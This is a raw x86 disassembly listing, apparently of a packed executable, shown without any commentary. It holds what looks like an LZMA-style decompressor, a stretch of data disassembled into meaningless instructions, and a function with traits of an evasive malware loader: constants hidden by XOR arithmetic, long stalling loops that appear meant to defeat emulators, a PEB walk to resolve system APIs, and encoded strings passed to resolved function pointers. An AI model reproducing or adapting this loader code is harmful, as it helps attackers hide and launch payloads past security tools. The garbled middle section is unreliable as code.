  42456c:	push   eax
  42456d:	mov    cl,dh
  42456f:	or     eax,0xffffffff
  424572:	shl    eax,cl
  424574:	not    eax
  424576:	push   eax
  424577:	add    cl,dl
  424579:	mov    edi,esi
  42457b:	sub    esp,0xc
  42457e:	sub    eax,eax
  424580:	inc    eax
  424581:	push   eax
  424582:	push   eax
  424583:	push   eax
  424584:	push   eax
  424585:	push   eax
  424586:	push   edi
  424587:	sub    esi,esi
  424589:	push   esi
  42458a:	or     ebx,0xffffffff
  42458d:	mov    eax,0x300
  424592:	shl    eax,cl
  424594:	lea    ecx,[eax+0x736]
  42459a:	mov    eax,0x4000400
  42459f:	shr    ecx,1
  4245a1:	rep stos DWORD PTR es:[edi],eax
  4245a3:	push   0x5
  4245a5:	pop    ecx
  4245a6:	call   0x424891
  4245ab:	loop   0x4245a6
  4245ad:	lea    esi,[esi]
  4245af:	lea    edi,[edi]
  4245b1:	mov    edi,DWORD PTR [ebp-0x4]
  4245b4:	mov    eax,DWORD PTR [ebp-0x10]
  4245b7:	sub    edi,DWORD PTR [ebp+0x24]
  4245ba:	and    eax,edi
  4245bc:	mov    DWORD PTR [ebp-0x18],eax
  4245bf:	mov    al,0x0
  4245c1:	call   0x4248a9
  4245c6:	jne    0x424661
  4245cc:	mov    cl,BYTE PTR [ebp-0xc]
  4245cf:	and    edi,DWORD PTR [ebp-0x14]
  4245d2:	shl    edi,cl
  4245d4:	sub    cl,0x8
  4245d7:	neg    cl
  4245d9:	shr    esi,cl
  4245db:	pop    eax
  4245dc:	add    edi,esi
  4245de:	pop    esi
  4245df:	lea    edi,[edi+edi*2]
  4245e2:	shl    edi,0x8
  4245e5:	cmp    al,0x7
  4245e7:	pop    edx
  4245e8:	lea    ecx,[esi+edi*2+0xe6c]
  4245ef:	push   ecx
  4245f0:	push   esi
  4245f1:	mov    esi,0x100
  4245f6:	push   eax
  4245f7:	mov    al,0x1
  4245f9:	jb     0x42462f
  4245fb:	mov    edi,DWORD PTR [ebp-0x4]
  4245fe:	sub    edi,DWORD PTR [ebp-0x24]
  424601:	movzx  edi,BYTE PTR [edi]
  424604:	mov    ebp,DWORD PTR [ebp-0x34]
  424607:	shl    edi,1
  424609:	mov    ecx,esi
  42460b:	and    esi,edi
  42460d:	add    ecx,esi
  42460f:	lea    ebp,[ebp+ecx*2+0x0]
  424613:	call   0x4248c8
  424618:	mov    ecx,eax
  42461a:	shr    esi,0x8
  42461d:	and    ecx,0x1
  424620:	cmp    esi,ecx
  424622:	mov    esi,0x100
  424627:	jne    0x424637
  424629:	cmp    eax,esi
  42462b:	jb     0x424604
  42462d:	jmp    0x424643
  42462f:	mov    ebp,DWORD PTR [ebp-0x34]
  424632:	call   0x4248c8
  424637:	inc    eax
  424638:	inc    esi
  424639:	sub    eax,0x1
  42463c:	sub    esi,0x1
  42463f:	cmp    eax,esi
  424641:	jb     0x42462f
  424643:	pop    edx
  424644:	inc    edx
  424645:	cmp    edx,0x5
  424648:	dec    edx
  424649:	mov    ecx,edx
  42464b:	jb     0x42465c
  42464d:	inc    edx
  42464e:	cmp    edx,0xb
  424651:	dec    edx
  424652:	mov    cl,0x4
  424654:	dec    cl
  424656:	jb     0x42465c
  424658:	mov    cl,0x7
  42465a:	dec    cl
  42465c:	sub    edx,ecx
  42465e:	push   edx
  42465f:	jmp    0x4246b0
  424661:	mov    al,0xc1
  424663:	dec    al
  424665:	call   0x4248b9
  42466a:	jne    0x424680
  42466c:	pop    eax
  42466d:	pop    edi
  42466e:	pop    edx
  42466f:	pop    ecx
  424670:	pop    edx
  424671:	pop    ecx
  424672:	push   DWORD PTR [esp]
  424675:	push   ecx
  424676:	push   edx
  424677:	mov    edx,0x664
  42467c:	mov    cl,0x0
  42467e:	jmp    0x4246f3
  424680:	mov    al,0xcd
  424682:	dec    al
  424684:	call   0x4248b9
  424689:	jne    0x4246b9
  42468b:	mov    al,0xf1
  42468d:	dec    al
  42468f:	call   0x4248a9
  424694:	jne    0x4246e9
  424696:	pop    eax
  424697:	cmp    al,0x7
  424699:	mov    al,0x9
  42469b:	jb     0x42469f
  42469d:	mov    al,0xb
  42469f:	push   eax
  4246a0:	mov    esi,DWORD PTR [ebp-0x4]
  4246a3:	sub    esi,DWORD PTR [ebp-0x24]
  4246a6:	cmp    esi,DWORD PTR [ebp+0x24]
  4246a9:	jb     0x424880
  4246af:	lods   al,BYTE PTR ds:[esi]
  4246b0:	mov    edi,DWORD PTR [ebp-0x4]
  4246b3:	stos   BYTE PTR es:[edi],al
  4246b4:	jmp    0x424847
  4246b9:	mov    al,0xd8
  4246bb:	call   0x4248b9
  4246c0:	mov    esi,DWORD PTR [ebp-0x28]
  4246c3:	je     0x4246e0
  4246c5:	mov    al,0xe4
  4246c7:	call   0x4248b9
  4246cc:	mov    esi,DWORD PTR [ebp-0x2c]
  4246cf:	je     0x4246da
  4246d1:	mov    esi,DWORD PTR [ebp-0x30]
  4246d4:	mov    ecx,DWORD PTR [ebp-0x2c]
  4246d7:	mov    DWORD PTR [ebp-0x30],ecx
  4246da:	mov    ecx,DWORD PTR [ebp-0x28]
  4246dd:	mov    DWORD PTR [ebp-0x2c],ecx
  4246e0:	mov    ecx,DWORD PTR [ebp-0x24]
  4246e3:	mov    DWORD PTR [ebp-0x28],ecx
  4246e6:	mov    DWORD PTR [ebp-0x24],esi
  4246e9:	pop    eax
  4246ea:	pop    edi
  4246eb:	pop    ecx
  4246ec:	mov    edx,0xa68
  4246f1:	mov    cl,0x8
  4246f3:	add    edx,edi
  4246f5:	push   edx
  4246f6:	push   edi
  4246f7:	cmp    al,0x7
  4246f9:	mov    al,cl
  4246fb:	jb     0x4246ff
  4246fd:	add    al,0x3
  4246ff:	push   eax
  424700:	mov    ebp,DWORD PTR [ebp-0x34]
  424703:	call   0x4248c6
  424708:	jne    0x42471e
  42470a:	mov    eax,DWORD PTR [ebp-0x18]
  42470d:	mov    edi,DWORD PTR [ebp-0x34]
  424710:	shl    eax,0x3
  424713:	sub    ecx,ecx
  424715:	push   0x8
  424717:	pop    esi
  424718:	lea    edi,[edi+eax*2+0x4]
  42471c:	jmp    0x424753
  42471e:	mov    ebp,DWORD PTR [ebp-0x34]
  424721:	add    ebp,0x2
  424724:	call   0x4248c6
  424729:	jne    0x424743
  42472b:	mov    eax,DWORD PTR [ebp-0x18]
  42472e:	mov    edi,DWORD PTR [ebp-0x34]
  424731:	shl    eax,0x3
  424734:	push   0x8
  424736:	pop    ecx
  424737:	push   0x8
  424739:	pop    esi
  42473a:	lea    edi,[edi+eax*2+0x104]
  424741:	jmp    0x424753
  424743:	mov    edi,0x204
  424748:	add    edi,DWORD PTR [ebp-0x34]
  42474b:	push   0x10
  42474d:	pop    ecx
  42474e:	mov    esi,0x100
  424753:	mov    DWORD PTR [ebp-0x1c],ecx
  424756:	sub    eax,eax
  424758:	inc    eax
  424759:	mov    ebp,edi
  42475b:	call   0x4248c8
  424760:	mov    ecx,eax
  424762:	sub    ecx,esi
  424764:	jb     0x424759
  424766:	add    DWORD PTR [ebp-0x1c],ecx
  424769:	cmp    DWORD PTR [ebp-0x3c],0x4
  42476d:	jae    0x424823
  424773:	add    DWORD PTR [ebp-0x3c],0x7
  424777:	mov    ecx,DWORD PTR [ebp-0x1c]
  42477a:	cmp    ecx,0x4
  42477d:	jb     0x424782
  42477f:	push   0x3
  424781:	pop    ecx
  424782:	mov    edi,DWORD PTR [ebp-0x38]
  424785:	shl    ecx,0x6
  424788:	sub    eax,eax
  42478a:	inc    eax
  42478b:	push   0x40
  42478d:	pop    esi
  42478e:	lea    edi,[edi+ecx*2+0x360]
  424795:	mov    ebp,edi
  424797:	call   0x4248c8
  42479c:	mov    ecx,eax
  42479e:	sub    ecx,esi
  4247a0:	jb     0x424795
  4247a2:	mov    DWORD PTR [ebp-0x18],ecx
  4247a5:	mov    DWORD PTR [ebp-0x24],ecx
  4247a8:	cmp    ecx,0x4
  4247ab:	jb     0x424820
  4247ad:	mov    esi,ecx
  4247af:	and    DWORD PTR [ebp-0x24],0x1
  4247b3:	shr    esi,1
  4247b5:	or     DWORD PTR [ebp-0x24],0x2
  4247b9:	dec    esi
  4247ba:	cmp    ecx,0xe
  4247bd:	jae    0x4247d8
  4247bf:	mov    eax,0x2af
  4247c4:	sub    eax,ecx
  4247c6:	mov    ecx,esi
  4247c8:	shl    BYTE PTR [ebp-0x24],cl
  4247cb:	add    eax,DWORD PTR [ebp-0x24]
  4247ce:	shl    eax,1
  4247d0:	add    eax,DWORD PTR [ebp-0x38]
  4247d3:	mov    DWORD PTR [ebp-0x34],eax
  4247d6:	jmp    0x424805
  4247d8:	sub    esi,0x4
  4247db:	call   0x424885
  4247e0:	shr    ebx,1
  4247e2:	shl    DWORD PTR [ebp-0x24],1
  4247e5:	cmp    DWORD PTR [ebp-0x20],ebx
  4247e8:	jb     0x4247f0
  4247ea:	inc    DWORD PTR [ebp-0x24]
  4247ed:	sub    DWORD PTR [ebp-0x20],ebx
  4247f0:	dec    esi
  4247f1:	jne    0x4247db
  4247f3:	mov    eax,0x644
  4247f8:	add    eax,DWORD PTR [ebp-0x38]
  4247fb:	mov    DWORD PTR [ebp-0x34],eax
  4247fe:	shl    DWORD PTR [ebp-0x24],0x4
  424802:	push   0x4
  424804:	pop    esi
  424805:	sub    edi,edi
  424807:	inc    edi
  424808:	mov    eax,edi
  42480a:	mov    ebp,DWORD PTR [ebp-0x34]
  42480d:	call   0x4248c8
  424812:	test   al,0x1
  424814:	je     0x424819
  424816:	or     DWORD PTR [ebp-0x24],edi
  424819:	shl    edi,1
  42481b:	dec    esi
  42481c:	jne    0x42480a
  42481e:	jmp    0x424820
  424820:	inc    DWORD PTR [ebp-0x24]
  424823:	mov    ecx,DWORD PTR [ebp-0x1c]
  424826:	add    ecx,0x2
  424829:	mov    edi,DWORD PTR [ebp-0x4]
  42482c:	mov    eax,edi
  42482e:	sub    eax,DWORD PTR [ebp+0x24]
  424831:	cmp    DWORD PTR [ebp-0x24],eax
  424834:	ja     0x424880
  424836:	mov    esi,edi
  424838:	sub    esi,DWORD PTR [ebp-0x24]
  42483b:	mov    edx,DWORD PTR [ebp+0x28]
  42483e:	lods   al,BYTE PTR ds:[esi]
  42483f:	stos   BYTE PTR es:[edi],al
  424840:	cmp    edi,edx
  424842:	jae    0x424847
  424844:	dec    ecx
  424845:	jne    0x42483e
  424847:	mov    DWORD PTR [ebp-0x4],edi
  42484a:	movzx  esi,al
  42484d:	cmp    edi,DWORD PTR [ebp+0x28]
  424850:	jb     0x4245b1
  424856:	call   0x424885
  42485b:	sub    eax,eax
  42485d:	lea    ebp,[esp+0x3c]
  424861:	mov    edx,DWORD PTR [ebp+0x20]
  424864:	mov    esi,DWORD PTR [ebp-0x8]
  424867:	sub    esi,DWORD PTR [ebp+0x18]
  42486a:	mov    DWORD PTR [edx],esi
  42486c:	mov    edx,DWORD PTR [ebp+0x2c]
  42486f:	mov    edi,DWORD PTR [ebp-0x4]
  424872:	sub    edi,DWORD PTR [ebp+0x24]
  424875:	mov    DWORD PTR [edx],edi
  424877:	leave  
  424878:	pop    ebx
  424879:	pop    esi
  42487a:	pop    edi
  42487b:	ret    0x1c
  42487e:	pop    esi
  42487f:	pop    eax
  424880:	sub    eax,eax
  424882:	inc    eax
  424883:	jmp    0x42485d
  424885:	cmp    ebx,0x1000000
  42488b:	jb     0x42488e
  42488d:	ret    
  42488e:	shl    ebx,0x8
  424891:	push   esi
  424892:	mov    esi,DWORD PTR [ebp-0x8]
  424895:	cmp    esi,DWORD PTR [ebp+0x1c]
  424898:	jae    0x42487e
  42489a:	mov    eax,DWORD PTR [ebp-0x20]
  42489d:	shl    eax,0x8
  4248a0:	lods   al,BYTE PTR ds:[esi]
  4248a1:	scas   eax,DWORD PTR es:[edi]
  4248a2:	sahf   
  4248a3:	or     al,0xaf
  4248a5:	pop    esi
  4248a6:	ins    BYTE PTR es:[edi],dx
  4248a7:	add    bl,BYTE PTR [eax-0x3a634149]
  4248ad:	arpl   WORD PTR [eax+edx*4-0x616a66f0],cx
  4248b4:	sub    al,0x95
  4248b6:	nop
  4248b7:	cmp    BYTE PTR [ecx-0x6a739c3b],ah
  4248bd:	sahf   
  4248be:	pushf  
  4248bf:	mov    bh,0x3e
  4248c1:	lods   al,BYTE PTR ds:[esi]
  4248c2:	mov    edi,0x35899e3a
  4248c7:	mov    WORD PTR [edi-0x707661c6],?
  4248cd:	js     0x424858
  4248cf:	mov    DWORD PTR [ecx-0x4806a973],ecx
  4248d5:	mov    edx,0x1a906919
  4248da:	sbb    DWORD PTR [ecx],ecx
  4248dc:	test   eax,0xfa19ba75
  4248e1:	push   esi
  4248e2:	sti    
  4248e3:	mov    bl,0xcd
  4248e5:	mov    BYTE PTR [edx+0x18906919],bl
  4248eb:	test   eax,0x919daab
  4248f0:	mov    bh,0xb8
  4248f2:	lds    esp,FWORD PTR [edi-0x22]
  4248f5:	mov    DWORD PTR [eax+0x47c5b530],edx
  4248fb:	mov    ah,0x6d
  4248fd:	mov    edx,0xe5560919
  424902:	mov    bh,0xf0
  424904:	outs   dx,DWORD PTR ds:[esi]
  424905:	mov    DWORD PTR [ecx-0x4bca7677],ebp
  42490b:	nop
  42490c:	xor    BYTE PTR [ebp-0x764172de],bl
  424912:	xchg   ebp,eax
  424913:	mov    WORD PTR [edi-0x6775e6c6],?
  424919:	nop
  42491a:	xor    al,0x9d
  42491c:	sub    eax,0x350919ba
  424921:	fldenv [esi+0x29]
  424924:	push   ebp
  424925:	add    BYTE PTR [ebx],al
  424927:	rol    BYTE PTR [ebx+0x6c8d01c0],0x24
  42492e:	inc    eax
  42492f:	ret    
  424930:	push   ebp
  424931:	mov    ebp,esp
  424933:	sub    esp,0x12c
  424939:	push   ebx
  42493a:	push   esi
  42493b:	push   edi
  42493c:	mov    DWORD PTR [ebp-0x10],0xf89c85a5
  424943:	mov    DWORD PTR [ebp-0x18],0xf89c85a4
  42494a:	mov    eax,DWORD PTR [ebp+0x8]
  42494d:	mov    DWORD PTR [ebp+0x8],eax
  424950:	mov    ecx,DWORD PTR [ebp-0x10]
  424953:	mov    ebx,0x75108af
  424958:	xor    ecx,ebx
  42495a:	mov    eax,0x3272f6
  42495f:	add    ecx,eax
  424961:	mov    DWORD PTR [ebp-0x2c],ecx
  424964:	mov    ecx,DWORD PTR [ebp-0x10]
  424967:	xor    ecx,ebx
  424969:	add    ecx,eax
  42496b:	mov    DWORD PTR [ebp-0x3c],ecx
  42496e:	mov    ecx,DWORD PTR [ebp-0x10]
  424971:	xor    ecx,ebx
  424973:	add    ecx,eax
  424975:	mov    DWORD PTR [ebp-0x40],ecx
  424978:	mov    ecx,DWORD PTR [ebp-0x10]
  42497b:	xor    ecx,ebx
  42497d:	add    ecx,eax
  42497f:	mov    DWORD PTR [ebp-0xd8],ecx
  424985:	mov    DWORD PTR [ebp-0x50],0xf89f05a5
  42498c:	mov    DWORD PTR [ebp-0x40],0xf89cb5a5
  424993:	mov    DWORD PTR [ebp-0x54],0xf89c85a1
  42499a:	push   0x25
  42499c:	pop    ecx
  42499d:	mov    DWORD PTR [ebp-0x38],ecx
  4249a0:	mov    DWORD PTR [ebp-0x38],ecx
  4249a3:	push   0x65
  4249a5:	pop    ecx
  4249a6:	mov    DWORD PTR [ebp-0x38],ecx
  4249a9:	mov    DWORD PTR [ebp-0x38],ecx
  4249ac:	mov    DWORD PTR [ebp-0x38],0x4d
  4249b3:	mov    DWORD PTR [ebp-0x38],0x43
  4249ba:	mov    ecx,DWORD PTR [ebp-0x10]
  4249bd:	xor    ecx,ebx
  4249bf:	add    ecx,eax
  4249c1:	mov    DWORD PTR [ebp-0x38],ecx
  4249c4:	mov    ecx,DWORD PTR [ebp-0x10]
  4249c7:	xor    ecx,ebx
  4249c9:	add    ecx,eax
  4249cb:	mov    DWORD PTR [ebp-0x38],ecx
  4249ce:	mov    DWORD PTR [ebp-0x28],0x258
  4249d5:	mov    DWORD PTR [ebp-0x20],0x36
  4249dc:	mov    DWORD PTR [ebp-0x14],0x7a
  4249e3:	lea    edi,[ebp-0x10c]
  4249e9:	lea    esi,[ebp-0x12c]
  4249ef:	call   0x4256b1
  4249f4:	dec    DWORD PTR [ebp-0x14]
  4249f7:	jne    0x4249e3
  4249f9:	dec    DWORD PTR [ebp-0x20]
  4249fc:	jne    0x4249dc
  4249fe:	dec    DWORD PTR [ebp-0x28]
  424a01:	jne    0x4249d5
  424a03:	mov    DWORD PTR [ebp-0x28],0x400e
  424a0a:	mov    eax,DWORD PTR [ebp-0x10]
  424a0d:	xor    eax,ebx
  424a0f:	mov    esi,0x3272f6
  424a14:	add    eax,esi
  424a16:	mov    DWORD PTR [ebp-0x1c],eax
  424a19:	mov    eax,DWORD PTR [ebp-0x10]
  424a1c:	and    DWORD PTR [ebp-0x94],0x0
  424a23:	xor    eax,ebx
  424a25:	add    eax,esi
  424a27:	mov    DWORD PTR [ebp-0x34],eax
  424a2a:	mov    eax,fs:0x18
  424a30:	mov    DWORD PTR [ebp-0x94],eax
  424a36:	mov    eax,DWORD PTR [eax+0x30]
  424a39:	mov    DWORD PTR [ebp-0xcc],eax
  424a3f:	mov    eax,DWORD PTR [eax+0xc]
  424a42:	mov    DWORD PTR [ebp-0xc0],eax
  424a48:	mov    eax,DWORD PTR [ebp+0x8]
  424a4b:	lea    ecx,[ebp-0x94]
  424a51:	mov    DWORD PTR [eax+0x1a0],ecx
  424a57:	mov    eax,DWORD PTR [ebp+0x8]
  424a5a:	lea    ecx,[ebp-0xcc]
  424a60:	mov    DWORD PTR [eax+0x1a4],ecx
  424a66:	mov    eax,DWORD PTR [ebp+0x8]
  424a69:	push   DWORD PTR [ebp+0x8]
  424a6c:	lea    ecx,[ebp-0xc0]
  424a72:	mov    DWORD PTR [eax+0x1a8],ecx
  424a78:	call   0x426e72
  424a7d:	mov    ecx,DWORD PTR [ebp-0x10]
  424a80:	xor    ecx,ebx
  424a82:	add    ecx,esi
  424a84:	cmp    ecx,eax
  424a86:	je     0x424e09
  424a8c:	mov    eax,DWORD PTR [ebp+0x8]
  424a8f:	mov    eax,DWORD PTR [eax+0x194]
  424a95:	mov    ecx,DWORD PTR [eax]
  424a97:	mov    eax,DWORD PTR [ebp+0x8]
  424a9a:	mov    eax,DWORD PTR [eax+0x194]
  424aa0:	mov    eax,DWORD PTR [eax]
  424aa2:	add    eax,DWORD PTR [ecx+0x3c]
  424aa5:	mov    ecx,DWORD PTR [ebp+0x8]
  424aa8:	mov    ecx,DWORD PTR [ecx+0x1e0]
  424aae:	lea    edx,[ebp-0xec]
  424ab4:	push   edx
  424ab5:	mov    edx,DWORD PTR [ebp+0x8]
  424ab8:	mov    edx,DWORD PTR [edx+0x18c]
  424abe:	mov    edx,DWORD PTR [edx]
  424ac0:	add    edx,DWORD PTR [eax+0x88]
  424ac6:	push   0x4
  424ac8:	push   DWORD PTR [eax+0x8c]
  424ace:	push   edx
  424acf:	call   DWORD PTR [ecx+0x1c]
  424ad2:	push   DWORD PTR [ebp+0x8]
  424ad5:	xor    eax,eax
  424ad7:	mov    DWORD PTR [ebp-0xa8],0x1b40103a
  424ae1:	mov    DWORD PTR [ebp-0xa4],0x14371122
  424aeb:	mov    DWORD PTR [ebp-0xa0],0x42111e0c
  424af5:	mov    BYTE PTR [ebp-0x9c],0x83
  424afc:	lea    edi,[ebp-0x9b]
  424b02:	stos   DWORD PTR es:[edi],eax
  424b03:	stos   WORD PTR es:[edi],ax
  424b05:	stos   BYTE PTR es:[edi],al
  424b06:	xor    eax,eax
  424b08:	mov    DWORD PTR [ebp-0xbc],0x1b40103a
  424b12:	mov    DWORD PTR [ebp-0xb8],0x14371122
  424b1c:	mov    DWORD PTR [ebp-0xb4],0x2c111e0c
  424b26:	mov    BYTE PTR [ebp-0xb0],0x83
  424b2d:	lea    edi,[ebp-0xaf]
  424b33:	stos   DWORD PTR es:[edi],eax
  424b34:	stos   WORD PTR es:[edi],ax
  424b36:	stos   BYTE PTR es:[edi],al
  424b37:	mov    edi,DWORD PTR [ebp+0x8]
  424b3a:	mov    eax,DWORD PTR [ebp+0x8]
  424b3d:	mov    edx,DWORD PTR [eax+0x1b8]
  424b43:	mov    DWORD PTR [ebp-0x68],0x110f1017
  424b4a:	mov    DWORD PTR [ebp-0x64],0x1a131620
  424b51:	mov    WORD PTR [ebp-0x60],0x8342
  424b57:	mov    DWORD PTR [ebp-0x90],0x1b40103a
  424b61:	mov    DWORD PTR [ebp-0x8c],0x17421122
  424b6b:	mov    DWORD PTR [ebp-0x88],0x35221b13
  424b75:	mov    DWORD PTR [ebp-0x84],0x111e160e
  424b7f:	mov    DWORD PTR [ebp-0x80],0x8342201a
  424b86:	mov    DWORD PTR [ebp-0x7c],0x1b40103a
  424b8d:	mov    DWORD PTR [ebp-0x78],0x17421122
  424b94:	mov    DWORD PTR [ebp-0x74],0x35221b13
  424b9b:	mov    DWORD PTR [ebp-0x70],0x111e160e
  424ba2:	mov    DWORD PTR [ebp-0x6c],0x832c201a
  424ba9:	call   0x426ea1
  424bae:	push   eax
  424baf:	mov    eax,DWORD PTR [ebp+0x8]
  424bb2:	mov    eax,DWORD PTR [eax+0x1a8]
  424bb8:	push   DWORD PTR [eax]
  424bba:	call   0x426b42
  424bbf:	test   eax,eax
  424bc1:	jne    0x424c13
  424bc3:	mov    eax,DWORD PTR [ebp+0x8]
  424bc6:	mov    eax,DWORD PTR [eax+0x1e0]
  424bcc:	mov    edi,DWORD PTR [ebp+0x8]
  424bcf:	add    eax,0x4
  424bd2:	mov    DWORD PTR [ebp-0x24],eax
  424bd5:	mov    eax,DWORD PTR [ebp+0x8]
  424bd8:	mov    edx,DWORD PTR [eax+0x1b8]
  424bde:	call   0x426ea1
  424be3:	push   eax
  424be4:	mov    eax,DWORD PTR [ebp-0x24]
  424be7:	call   DWORD PTR [eax]
  424be9:	test   eax,eax
  424beb:	jne    0x424c13
  424bed:	mov    eax,DWORD PTR [ebp+0x8]
  424bf0:	mov    eax,DWORD PTR [eax+0x1e0]
  424bf6:	mov    edi,DWORD PTR [ebp+0x8]
  424bf9:	add    eax,0x10
  424bfc:	mov    DWORD PTR [ebp-0x24],eax
  424bff:	mov    eax,DWORD PTR [ebp+0x8]
  424c02:	mov    edx,DWORD PTR [eax+0x1b8]
  424c08:	call   0x426ea1
  424c0d:	push   eax
  424c0e:	mov    eax,DWORD PTR [ebp-0x24]
  424c11:	call   DWORD PTR [eax]
  424c13:	mov    eax,DWORD PTR [ebp-0x10]
  424c16:	mov    ecx,DWORD PTR [ebp-0x28]
  424c19:	xor    eax,ebx
  424c1b:	add    eax,esi
  424c1d:	cmp    eax,ecx
  424c1f:	je     0x424de2
  424c25:	mov    eax,DWORD PTR [ebp-0x18]
  424c28:	xor    eax,ebx
  424c2a:	mov    ecx,0xffcd8d0a
  424c2f:	sub    ecx,eax
  424c31:	add    ecx,DWORD PTR [ebp-0x28]
  424c34:	mov    eax,DWORD PTR [ebp-0x1c]
  424c37:	cmp    eax,ecx
  424c39:	ja     0x424de2
  424c3f:	mov    DWORD PTR [ebp-0x20],0x0
  424c46:	push   DWORD PTR [ebp+0x8]
  424c49:	mov    edi,DWORD PTR [ebp+0x8]
  424c4c:	mov    eax,DWORD PTR [ebp+0x8]
  424c4f:	mov    edx,DWORD PTR [eax+0x1b4]
  424c55:	call   0x426ea1
  424c5a:	push   eax
  424c5b:	mov    eax,DWORD PTR [ebp+0x8]
  424c5e:	mov    eax,DWORD PTR [eax+0x1a8]
  424c64:	push   DWORD PTR [eax]
  424c66:	call   0x426b42
  424c6b:	mov    ecx,DWORD PTR [ebp+0x8]
  424c6e:	mov    ecx,DWORD PTR [ecx+0x19c]
  424c74:	mov    DWORD PTR [ecx],eax
  424c76:	mov    eax,DWORD PTR [ebp+0x8]
  424c79:	mov    edi,DWORD PTR [eax+0x1e0]
  424c7f:	mov    esi,DWORD PTR [ebp+0x8]
  424c82:	xor    eax,eax
  424c84:	lea    edx,[ebp-0x7c]
  424c87:	call   0x426ed7
  424c8c:	push   eax
  424c8d:	mov    eax,DWORD PTR [ebp+0x8]
  424c90:	mov    eax,DWORD PTR [eax+0x19c]
  424c96:	push   DWORD PTR [eax]
  424c98:	call   DWORD PTR [edi+0x8]
  424c9b:	mov    DWORD PTR [ebp-0x24],eax
  424c9e:	mov    eax,DWORD PTR [ebp+0x8]
  424ca1:	mov    edi,DWORD PTR [eax+0x1e0]
  424ca7:	mov    esi,DWORD PTR [ebp+0x8]
  424caa:	xor    eax,eax
  424cac:	lea    edx,[ebp-0x90]
  424cb2:	call   0x426ed7
  424cb7:	push   eax
  424cb8:	mov    eax,DWORD PTR [ebp+0x8]
  424cbb:	mov    eax,DWORD PTR [eax+0x19c]
  424cc1:	push   DWORD PTR [eax]
  424cc3:	call   DWORD PTR [edi+0x8]
  424cc6:	mov    eax,DWORD PTR [ebp+0x8]
  424cc9:	mov    edi,DWORD PTR [eax+0x1e0]
  424ccf:	mov    esi,DWORD PTR [ebp+0x8]
  424cd2:	xor    eax,eax
  424cd4:	lea    edx,[ebp-0xa8]
  424cda:	call   0x426ed7
  424cdf:	push   eax
  424ce0:	mov    eax,DWORD PTR [ebp+0x8]
  424ce3:	mov    eax,DWORD PTR [eax+0x19c]
  424ce9:	push   DWORD PTR [eax]
  424ceb:	call   DWORD PTR [edi+0x8]
  424cee:	and    DWORD PTR [ebp-0x8],0x0
  424cf2:	mov    DWORD PTR [ebp-0x44],eax
  424cf5:	mov    eax,DWORD PTR [ebp-0x8]
  424cf8:	and    eax,0x7
  424cfb:	add    eax,0x31
  424cfe:	push   eax
  424cff:	call   DWORD PTR [ebp-0x24]
  424d02:	test   eax,eax
  424d04:	je     0x424d48
  424d06:	mov    eax,DWORD PTR [ebp-0x8]
  424d09:	push   0x19
  424d0b:	xor    edx,edx
  424d0d:	pop    ecx
  424d0e:	div    ecx
  424d10:	add    dl,0x41
  424d13:	movzx  eax,dl
  424d16:	push   eax
  424d17:	call   DWORD PTR [ebp-0x44]
  424d1a:	test   eax,eax
  424d1c:	jne    0x424d48
  424d1e:	mov    eax,DWORD PTR [ebp+0x8]
  424d21:	mov    edi,DWORD PTR [eax+0x1e0]
  424d27:	mov    esi,DWORD PTR [ebp+0x8]
  424d2a:	xor    eax,eax
  424d2c:	lea    edx,[ebp-0x68]
  424d2f:	call   0x426ed7
  424d34:	push   eax
  424d35:	mov    eax,DWORD PTR [ebp+0x8]
  424d38:	mov    eax,DWORD PTR [eax+0x198]
  424d3e:	push   DWORD PTR [eax]
  424d40:	call   DWORD PTR [edi+0x8]
  424d43:	mov    DWORD PTR [ebp-0x14],eax
  424d46:	jmp    0x424d4c
  424d48:	and    DWORD PTR [ebp-0x14],0x0
  424d4c:	inc    DWORD PTR [ebp-0x8]
  424d4f:	cmp    DWORD PTR [ebp-0x8],0x10
  424d53:	jb     0x424cf5
  424d55:	mov    eax,DWORD PTR [ebp-0x18]
  424d58:	mov    esi,DWORD PTR [ebp+0x8]
  424d5b:	xor    eax,ebx
  424d5d:	mov    edi,0x3272f6
  424d62:	add    eax,edi
  424d64:	lea    edx,[ebp-0x10c]
  424d6a:	call   0x426ed7
  424d6f:	push   eax
  424d70:	mov    eax,DWORD PTR [ebp-0x10]
  424d73:	mov    esi,DWORD PTR [ebp+0x8]
  424d76:	xor    eax,ebx
  424d78:	add    eax,edi
  424d7a:	lea    edx,[ebp-0x12c]
  424d80:	call   0x426ed7
  424d85:	push   eax
  424d86:	call   DWORD PTR [ebp-0x14]
  424d89:	mov    ecx,DWORD PTR [ebp-0x10]
  424d8c:	xor    ecx,ebx
  424d8e:	add    ecx,edi
  424d90:	cmp    ecx,eax
  424d92:	jne    0x424d9b
  424d94:	mov    DWORD PTR [ebp-0x20],0x1
  424d9b:	mov    eax,DWORD PTR [ebp-0x18]
  424d9e:	mov    ecx,DWORD PTR [ebp-0x1c]
  424da1:	xor    eax,ebx
  424da3:	lea    eax,[eax+ecx*1+0x3272f6]
  424daa:	mov    DWORD PTR [ebp-0x1c],eax
  424dad:	mov    eax,DWORD PTR [ebp-0x20]
  424db0:	test   eax,eax
  424db2:	je     0x424dc6
  424db4:	mov    eax,DWORD PTR [ebp-0x18]
  424db7:	mov    ecx,DWORD PTR [ebp-0x34]
  424dba:	xor    eax,ebx
  424dbc:	lea    eax,[eax+ecx*1+0x3272f6]
  424dc3:	mov    DWORD PTR [ebp-0x34],eax
  424dc6:	mov    eax,DWORD PTR [ebp-0x18]
  424dc9:	xor    eax,ebx
  424dcb:	mov    ecx,0xffcd8d0a
  424dd0:	sub    ecx,eax
  424dd2:	add    ecx,DWORD PTR [ebp-0x28]
  424dd5:	mov    eax,DWORD PTR [ebp-0x1c]
  424dd8:	cmp    eax,ecx
  424dda:	jbe    0x424c3f
  424de0:	mov    esi,edi
  424de2:	mov    eax,DWORD PTR [ebp-0x34]
  424de5:	mov    ecx,DWORD PTR [ebp-0x1c]
  424de8:	cmp    ecx,eax
  424dea:	jne    0x424dfd
  424dec:	push   DWORD PTR [ebp+0x8]
  424def:	lea    eax,[ebp-0x3c]
  424df2:	push   eax
  424df3:	call   0x427946
  424df8:	mov    DWORD PTR [ebp-0x2c],eax
  424dfb:	jmp    0x424e09
  424dfd:	mov    eax,DWORD PTR [ebp-0x2c]
  424e00:	mov    ecx,DWORD PTR [ebp-0x18]
  424e03:	xor    ecx,ebx
  424e05:	add    ecx,esi
  424e07:	xor    DWORD PTR [eax],ecx
  424e09:	mov    eax,DWORD PTR [ebp-0x10]
  424e0c:	mov    ecx,DWORD PTR [ebp-0x2c]
  424e0f:	xor    eax,ebx
  424e11:	add    eax,esi
  424e13:	cmp    eax,ecx
  424e15:	je     0x42558f
